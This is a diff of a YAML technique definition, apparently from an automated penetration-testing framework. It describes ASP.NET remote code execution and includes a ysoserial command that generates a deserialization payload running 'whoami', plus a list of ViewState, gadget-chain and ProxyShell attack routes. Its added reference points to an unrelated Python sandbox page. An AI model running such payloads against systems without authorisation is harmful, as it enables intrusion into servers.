@@ -2,15 +2,18 @@ name: rce_dotnet
 category: web
 description: ASP.NET RCE techniques
 preconditions:
-  - service.port==80
+- service.port==80
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c 'cmd /c whoami'"
+command_template: ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c 'cmd
+  /c whoami'
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: ".NET RCE: ViewState deserialization (need machineKey), BinaryFormatter, ObjectDataProvider gadgets, TypeConfuseDelegate. Also: Exchange ProxyShell chain."
+mechanism: '.NET RCE: ViewState deserialization (need machineKey), BinaryFormatter,
+  ObjectDataProvider gadgets, TypeConfuseDelegate. Also: Exchange ProxyShell chain.'
+hacktricks_ref: generic-methodologies-and-resources/python/bypass-python-sandboxes/README.md
